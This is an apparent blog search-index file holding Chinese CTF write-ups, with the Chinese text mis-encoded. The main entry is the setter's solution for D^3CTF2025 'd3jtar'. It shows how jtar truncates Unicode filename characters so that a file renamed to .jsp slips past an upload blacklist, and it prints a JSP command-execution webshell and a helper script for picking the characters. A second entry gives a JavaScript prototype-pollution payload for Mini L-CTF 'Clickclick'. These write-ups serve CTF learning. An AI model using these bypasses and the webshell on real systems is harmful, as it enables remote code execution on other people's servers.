<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>D^3CTF2025 d3jtar å‡ºé¢˜åŠ WP</title>
    <link href="/2025/06/02/D3CTF-d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/"/>
    <url>/2025/06/02/D3CTF-d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/</url>
    
    <content type="html"><![CDATA[<h1 id="D-3CTF2025-d3jtar-å‡ºé¢˜åŠ-WP"><a href="#D-3CTF2025-d3jtar-å‡ºé¢˜åŠ-WP" class="headerlink" title="D^3CTF2025 d3jtar å‡ºé¢˜åŠ WP"></a>D^3CTF2025 d3jtar å‡ºé¢˜åŠ WP</h1><h1 id="é˜…å‰å£°æ˜"><a href="#é˜…å‰å£°æ˜" class="headerlink" title="é˜…å‰å£°æ˜"></a>é˜…å‰å£°æ˜</h1><p>æœ¬é¢˜ç”± <strong><a href="https://github.com/luelueking">1ue</a>å¸ˆå‚…</strong>æä¾›å…³é”®æ€è·¯ï¼æ„Ÿè°¢<strong>åä¼šå¤§ä½¬</strong>ä»¬çš„å¸®åŠ©ï¼</p><h1 id="d3jtar"><a href="#d3jtar" class="headerlink" title="d3jtar"></a>d3jtar</h1><p>jtar æ˜¯ java ä¸­æ‰“ tar åŒ…çš„å¸¸ç”¨åº“ï¼Œå®ƒå¯¹æ–‡ä»¶åçš„å¤„ç†å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œæœ¬é¢˜å³å›´ç»•è¿™ä¸€ç‚¹åœ¨æ–‡ä»¶å¤‡ä»½åœºæ™¯ä¸­å±•å¼€ï¼Œå¸Œæœ›é€‰æ‰‹é€šè¿‡è‡ªè¡Œå°è¯•ã€æŒ–æ˜ jtar å·¥ä½œç»†èŠ‚æ¥è·å– flagã€‚</p><p>é¢˜ä¸­çš„ç½‘ç«™æ–‡ä»¶å¤‡ä»½ç³»ç»Ÿçš„ view è·¯ç”±ä¸‹é…ç½®äº†ä¸å®‰å…¨çš„ jsp è§£æï¼Œæ˜¾ç„¶åªè¦æˆåŠŸä¸Šä¼  jsp æ–‡ä»¶å³å¯ RCEã€‚ç„¶è€Œåç«¯å¯¹ä¸Šä¼ æ–‡ä»¶çš„åç§°åšäº†è¾ƒä¸ºä¸¥æ ¼çš„æ ¡éªŒï¼Œç†æƒ³æƒ…å†µä¸‹é€‰æ‰‹æ— æ³•é€šè¿‡å…¶ä»–æ‰‹æ®µç»•è¿‡ secureUpload æ ¡éªŒæ¥ä¸Šä¼  jsp æ–‡ä»¶ã€‚</p><p>é‚£ä¹ˆç»“åˆé¢˜ç›®åç§°ï¼Œçªç ´å£å°±åœ¨äº jtarã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ jtar æ‰“åŒ…çš„å·¥ä½œæµç¨‹ï¼š</p><p>ä» <a href="https://github.com/kamranzafar/jtar">https://github.com/kamranzafar/jtar</a> æ‹‰å–æºç ï¼Œæ·»åŠ ä¸€ä¸ªä¸é¢˜ç›®åŸºæœ¬ä¸€è‡´çš„ Backup</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.kamranzafar.jtar;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Path;<br><span class="hljs-keyword">import</span> java.util.Collections;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Backup</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        tarDirectory(Path.of(<span class="hljs-string">&quot;1.tar&quot;</span>), Path.of(<span class="hljs-string">&quot;tmp/tar&quot;</span>));<br>        untar(Path.of(<span class="hljs-string">&quot;tmp/untar&quot;</span>), Path.of(<span class="hljs-string">&quot;1.tar&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tarDirectory</span><span class="hljs-params">(Path outputFile, Path inputDirectory)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        tarDirectory(outputFile, inputDirectory, Collections.emptyList());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tarDirectory</span><span class="hljs-params">(Path outputFile, Path inputDirectory, List&lt;String&gt; pathPrefixesToExclude)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// Output file stream</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">dest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(outputFile.toFile());<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Path</span> <span class="hljs-variable">outputFileAbsolute</span> <span class="hljs-operator">=</span> outputFile.normalize().toAbsolutePath();<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Path</span> <span class="hljs-variable">inputDirectoryAbsolute</span> <span class="hljs-operator">=</span> inputDirectory.normalize().toAbsolutePath();<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">inputPathLength</span> <span class="hljs-operator">=</span> inputDirectoryAbsolute.toString().length();<br><br>        <span class="hljs-comment">// Create a TarOutputStream</span><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">TarOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TarOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(dest))) &#123;<br>            Files.walk(inputDirectoryAbsolute).forEach(entry -&gt; &#123;<br>                <span class="hljs-keyword">if</span> (Files.isDirectory(entry))<br>                    <span class="hljs-keyword">return</span>;<br><br>                <span class="hljs-comment">// Don&#x27;t try to compress the output.tar file into itself</span><br>                <span class="hljs-keyword">if</span> (entry.equals(outputFileAbsolute))<br>                    <span class="hljs-keyword">return</span>;<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">relativeName</span> <span class="hljs-operator">=</span> entry.toString().substring(inputPathLength + <span class="hljs-number">1</span>);<br><br>                    out.putNextEntry(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TarEntry</span>(entry.toFile(), relativeName));<br>                    <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">origin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(entry.toFile()));<br>                    <span class="hljs-type">int</span> count;<br>                    <span class="hljs-type">byte</span> data[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br><br>                    <span class="hljs-keyword">while</span> ((count = origin.read(data)) != -<span class="hljs-number">1</span>) &#123;<br>                        out.write(data, <span class="hljs-number">0</span>, count);<br>                    &#125;<br><br>                    out.flush();<br>                    origin.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">untar</span><span class="hljs-params">(Path outputDirectory, Path inputTarFile)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(inputTarFile.toFile())) &#123;<br>            untar(outputDirectory, fileInputStream);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">untar</span><span class="hljs-params">(Path outputDirectory, InputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">TarInputStream</span> <span class="hljs-variable">tarInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TarInputStream</span>(inputStream)) &#123;<br>            TarEntry entry;<br><br>            <span class="hljs-keyword">while</span> ((entry = tarInputStream.getNextEntry()) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">int</span> count;<br>                <span class="hljs-type">byte</span> data[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">32768</span>];<br>                <span class="hljs-type">File</span> <span class="hljs-variable">outputFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(outputDirectory + <span class="hljs-string">&quot;/&quot;</span> + entry.getName());<br>                <span class="hljs-keyword">if</span> (!outputFile.getParentFile().isDirectory())<br>                    outputFile.getParentFile().mkdirs();<br><br>                <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(outputFile);<br>                <span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">dest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(fos);<br><br>                <span class="hljs-keyword">while</span> ((count = tarInputStream.read(data)) != -<span class="hljs-number">1</span>) &#123;<br>                    dest.write(data, <span class="hljs-number">0</span>, count);<br>                &#125;<br><br>                dest.flush();<br>                dest.close();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ 41 è¡Œ <code>out.putNextEntry(new TarEntry(entry.toFile(), relativeName));</code> æ‰“ä¸‹æ–­ç‚¹ï¼Œå¹¶æ­¥å…¥ <code>putNextEntry</code>ï¼Œè¿™é‡Œæ˜¯åœ¨éå†å‹ç¼©ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶æ—¶å°†æ¯ä¸ªæ–‡ä»¶çš„æ–‡ä»¶åç­‰æ¡ç›®å†™å…¥å­—èŠ‚æµã€‚</p><p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/RQE7bq7u0othz2xGrAzce3iKnLe.png"></p><p>éšåæ­¥å…¥ <code>entry.writeEntryHeader( header );</code></p><p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/Nu43bWo5uo0olxxNoDIcMrrAnYg.png"></p><p>å†æ­¥å…¥ <code>offset = TarHeader.getNameBytes(header.name, outbuf, offset, TarHeader._NAMELEN_);</code>ï¼Œ<code>getNameBytes</code> å³æ˜¯é’ˆå¯¹ <code>header</code> ä¸­çš„æ–‡ä»¶åä» <code>StringBuffer</code> å‘ <code>Bytes</code> è½¬æ¢ã€‚</p><p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/QSlnbDl6Toz1zxx3lDXcs51YnYf.png"></p><p>æ­¤å¤„å¼ºåˆ¶è½¬æ¢å‘ç”Ÿå­—ç¬¦æˆªæ–­ã€‚</p><p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/BLo8bnXrNoL1SmxTO7hc5QvJnkh.png"></p><p>åç¼€ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º 2 å­—èŠ‚çš„ä¸­æ–‡å­—ç¬¦â€œå‰ªâ€ï¼ŒæŠ›å¼ƒé«˜ 8 ä½ä»…ä¿ç•™ä½ 8 ä½ï¼Œå­—ç¬¦è¢«æˆªæ–­ä¸º ASCII ç  106 å³ <code>j</code>ï¼Œåä¸¤ä¸ªå­—ç¬¦åŒç†ã€‚</p><p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/HQWRbkexZojXSKxEWDucRzXanwh.png"></p><p>æ‰“åŒ…å‰åŠæ¢å¤åæ•ˆæœå¦‚å›¾</p><p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/Ty3pbUPBcohqIlx4L8scza7JnDf.png"></p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†åç¼€å¸¦æœ‰ç‰¹å®š unicode å­—ç¬¦çš„æ–‡ä»¶ä¸Šä¼ è‡³é¶æœºï¼Œç»•è¿‡åç¼€é»‘åå•æ£€æŸ¥ï¼Œé€šè¿‡å¤‡ä»½ä¸æ¢å¤åŠŸèƒ½å°†ä¸Šä¼ çš„æ–‡ä»¶è½¬å˜ä¸º jsp åç¼€çš„æ–‡ä»¶ï¼Œæœ€ç»ˆ RCE è·å– flagã€‚</p><p>ç¤ºä¾‹æ–‡ä»¶å¦‚ä¸‹ï¼š</p><p>æ–‡ä»¶åï¼špayload.é™ªsp â€“&gt; payload.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;printenv&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(p.getInputStream()));<br>        String line;<br>        <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            output += line + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        output = <span class="hljs-string">&quot;Error executing command: &quot;</span> + e.getMessage();<br>    &#125;<br>%&gt;<br><br>&lt;html&gt;<br>&lt;head&gt;&lt;title&gt;Command Output&lt;/title&gt;&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h2&gt;Executed Command: &lt;code&gt;&lt;%= cmd %&gt;&lt;/code&gt;&lt;/h2&gt;<br>&lt;pre&gt;&lt;%= output %&gt;&lt;/pre&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>è§£é¢˜æ‰€ä½¿ç”¨çš„ unicode å­—ç¬¦å¯ä»¥å‚è€ƒä»¥ä¸‹è„šæœ¬è·å–ï¼Œåªè¦å¯ä»¥è½¬æ¢ä¸ºæ­£å¸¸åç¼€çš„ ASCII å­—ç¬¦å³å¯ï¼Œä¾‹å¦‚ <code>payload.ë©ªâ…³ã°</code> ä¹Ÿæ˜¯ç›¸åŒæ•ˆæœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unicodedata<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_search</span>(<span class="hljs-params">byte_value</span>):<br>    low_byte = byte_value &amp; <span class="hljs-number">0xFF</span><br>    candidates = []<br><br>    <span class="hljs-keyword">for</span> high <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span> + <span class="hljs-number">1</span>):<br>        code_point = (high &lt;&lt; <span class="hljs-number">8</span>) | low_byte<br>        <span class="hljs-keyword">try</span>:<br>            char = <span class="hljs-built_in">chr</span>(code_point)<br>            name = unicodedata.name(char)<br>            candidates.append((<span class="hljs-string">f&quot;U+<span class="hljs-subst">&#123;code_point:04X&#125;</span>&quot;</span>, char, name))<br>        <span class="hljs-keyword">except</span> ValueError:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">return</span> candidates<br><br>ascii_character = <span class="hljs-string">&quot;j&quot;</span>  <span class="hljs-comment"># &quot;s&quot;,&quot;p&quot;</span><br>byte_val = <span class="hljs-built_in">ord</span>(ascii_character)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Possible original characters (<span class="hljs-subst">&#123;byte_val&#125;</span> â†’ 0x<span class="hljs-subst">&#123;byte_val &amp; <span class="hljs-number">0xFF</span>:02X&#125;</span>ï¼‰:&quot;</span>)<br>results = reverse_search(byte_val)<br><span class="hljs-keyword">for</span> cp, char, name <span class="hljs-keyword">in</span> results:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;cp&#125;</span>: <span class="hljs-subst">&#123;char&#125;</span> - <span class="hljs-subst">&#123;name&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>å¦å¤–ï¼Œå…¶å®é€‰æ‰‹å¦‚æœæœ‰å¿ƒæ³¨æ„çš„è¯ï¼Œåœ¨ jtar çš„ github é¡¹ç›®é‡Œæœ‰ä¸€æ¡ 23 å¹´çš„ prï¼ˆæœ€ä¸Šæ–¹ï¼‰ï¼Œæ˜¯å…³äºä¸­æ–‡ç¼–ç é”™è¯¯çš„ä¿®æ”¹ï¼ˆå…¶å®é—®é¢˜ä¸æ­¢ä¸­æ–‡ï¼Œä¾‹å¦‚â€œë©ªâ€æˆ–è€…å…¶ä»–ç‰¹æ®Šå­—ç¬¦ï¼Œè¿™æ¡ pr å¹¶æœªè¢«åˆå¹¶ï¼‰ï¼Œé‚£ä¹ˆè¿™æˆ–è®¸å¯ä»¥ä½œä¸ºä¸€æ¡æ½œåœ¨çš„ hintï¼Œè‡³å°‘èƒ½æé†’é€‰æ‰‹ jtar çš„ç¼–ç å¤„ç†å¯èƒ½æœ‰äº›é—®é¢˜ï¼Œæ‰¾åˆ°æŒ–æ˜åˆ©ç”¨ç‚¹çš„æ–¹å‘ã€‚</p><p>ï¼ˆ<a href="https://github.com/kamranzafar/jtar/pull/36/commits/0fc08d31fe4bf0b0fad2f5a2f3acb3f5c14858ac">https://github.com/kamranzafar/jtar/pull/36/commits/0fc08d31fe4bf0b0fad2f5a2f3acb3f5c14858ac</a>ï¼‰</p><p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/GGYVbXPANoVuAdxOLdXclOOxnEe.png"></p><h1 id="èµ›äº‹ç»“æœ"><a href="#èµ›äº‹ç»“æœ" class="headerlink" title="èµ›äº‹ç»“æœ"></a>èµ›äº‹ç»“æœ</h1><p>d3jtar çš„æœ€ç»ˆè§£æ•°ä¸º 13 è§£ã€‚å¥½æ¶ˆæ¯æ˜¯æ²¡æœ‰å‡ºç°éé¢„æœŸã€‚ğŸ˜‰</p><p>åœ¨æŸ¥çœ‹å‚èµ›é˜Ÿä¼æäº¤çš„ WP æ—¶å‘ç°ï¼Œæœ‰ä¸€æ”¯é˜Ÿä¼ï¼ˆä¼¼ä¹å½“æ—¶å¹¶æœªå‘ç°å¯ä»¥ç»•è¿‡çš„æ ¹æœ¬åŸå› ï¼‰ä½¿ç”¨äº†ç•¥æœ‰ä¸åŒçš„ payloadï¼Œåç¼€ä¸º <code>.jspè€€</code> â€“&gt; <code>.jsp</code>ï¼Œå½“ç„¶æœ¬è´¨åŸç†æ˜¯ä¸€æ ·çš„ï¼Œä½†åˆšå¥½è€€çš„ unicode ä¸º <code>\u8000</code>ï¼Œæˆªæ–­åå˜ä¸º <code>00</code></p><p>å¦‚éœ€å¤ç°ï¼Œå¯è‡³ä»“åº“ <a href="https://github.com/5i1encee/D3CTF2025-d3jtar">https://github.com/5i1encee/D3CTF2025-d3jtar</a> è·å–é¢˜ç›®ç¯å¢ƒåŠé™„ä»¶</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>WriteUp</tag>
      
      <tag>å‡ºé¢˜</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mini L-CTF</title>
    <link href="/2025/05/15/Mini%20L-CTF/"/>
    <url>/2025/05/15/Mini%20L-CTF/</url>
    
    <content type="html"><![CDATA[<h1 id="Mini-L-CTF"><a href="#Mini-L-CTF" class="headerlink" title="Mini L-CTF"></a>Mini L-CTF</h1><h1 id="Clickclick"><a href="#Clickclick" class="headerlink" title="Clickclick"></a>Clickclick</h1><p>è¿™é¢˜è€ƒç‚¹æ˜¯ js çš„åŸå‹é“¾æ±¡æŸ“ï¼Œä¹‹å‰æ²¡æ€ä¹ˆæ¥è§¦è¿‡è®°å½•ä¸€ä¸‹ã€‚</p><p>é¢˜ç›®æè¿°ç‚¹å‡» 10000 æ¬¡å‡ºç°ä¸ä¸€æ ·çš„ä¸œè¥¿ï¼Œæ‰“å¼€æŠ“åŒ…å¤šæ¬¡ç‚¹å‡»å‘ç°æ¯ 50 æ¬¡å‘ä¸€æ¬¡åŒ…å¦‚ä¸‹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;set&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;point&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;amount&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">50</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ amount å€¼å°è¯• 1000ã€10000 ç­‰å‚æ•°ï¼Œå‘ç°åˆ°è¾¾ 1000 åå‡è¿”å›â€œä½ æŒ‰çš„å¤ªå¿«äº†ï¼â€</p><p>å®¡è®¡ä¸€ä¸‹å‰ç«¯ä»£ç æˆ–è€…ä½¿ç”¨å¦‚ä¸‹ä»£ç åœ¨æ§åˆ¶å°è¿è¡Œå³å¯çœ‹åˆ°ç‚¹å‡» 10000 æ¬¡çš„æç¤º</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">but = document.querySelector(<span class="hljs-string">&quot;#app &gt; main &gt; div &gt; button&quot;</span>)<br>for (var i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) <span class="hljs-punctuation">&#123;</span><br>    but.click();<br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/miniLCTF2025/I142bjCa8ofO3dx3KKpcGgwHnDe.png"></p><p>if ( req.body.point.amount &#x3D;&#x3D; 0 || req.body.point.amount &#x3D;&#x3D; null) { delete req.body.point.amount }</p><p>ä¹Ÿå°±æ˜¯è¯´å½“ä¼ é€’çš„ amount å‚æ•°ä¸º 0 æ—¶ä¼šç›´æ¥åˆ é™¤ï¼Œç»“åˆåç«¯è¯­è¨€ä¸º JavaScript æ‰€ä»¥è€ƒè™‘åŸå‹é“¾æ±¡æŸ“ï¼Œä½¿ç”¨ payload å¦‚ä¸‹ï¼Œåˆ é™¤åæ±¡æŸ“åŸå‹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;set&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;point&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;amount&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;amount&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10000</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ezCC"><a href="#ezCC" class="headerlink" title="ezCC"></a>ezCC</h1><p>æš‚æ—¶æ²¡æ—¶é—´äº†ï¼Œæ ‡è®°ä¸€ä¸‹åç»­å­¦ä¹ æ•´ç†æ›´æ–°</p><p><a href="https://github.com/XDSEC/miniLCTF_2025/blob/main/OfficialWriteups/Web/ezCC_Official.pdf">https://github.com/XDSEC/miniLCTF_2025&#x2F;blob&#x2F;main&#x2F;OfficialWriteups&#x2F;Web&#x2F;ezCC_Official.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ACTF2025</title>
    <link href="/2025/05/15/ACTF2025/"/>
    <url>/2025/05/15/ACTF2025/</url>
    
